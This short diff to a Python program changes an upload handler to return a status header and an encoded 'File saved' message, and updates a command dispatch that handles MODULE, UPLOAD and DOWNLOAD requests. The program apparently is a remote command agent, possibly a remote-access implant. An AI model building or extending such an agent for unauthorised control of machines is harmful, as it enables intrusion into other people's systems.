@@ -271,7 +271,7 @@ def upload(data):
 
     file_path = f"{os.getcwd()}\\{name}"
         
-    return None, f"File saved at {file_path}"
+    return b"UPLOAD_FILE_OK", f"File saved at {file_path}".encode()
 
 def download(data):
     parts = data.split(b"::::")
@@ -302,7 +302,7 @@ def main():
                 case "MODULE":
                     header, response = execute_module(cmd)
                 case "UPLOAD":
-                    _, response = upload(cmd)
+                    header, response = upload(cmd)
                 case "DOWNLOAD":
                     header, response = download(cmd)
                 case _:
